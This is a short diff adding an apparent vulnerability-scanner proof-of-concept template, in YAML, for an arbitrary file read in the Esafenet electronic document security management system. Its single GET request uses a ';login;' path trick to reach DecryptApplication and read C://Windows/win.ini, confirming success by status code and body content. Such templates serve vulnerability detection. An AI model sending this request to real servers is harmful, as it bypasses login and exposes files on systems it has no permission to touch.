@@ -1,0 +1,9 @@
+name: poc-yaml-亿赛通-电子文档安全管理系统-Directory
+description: "任意文件读取"
+method: GET
+path:
+  - /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1
+expression:
+  status: 200
+  body_all:
+    - "Mail"
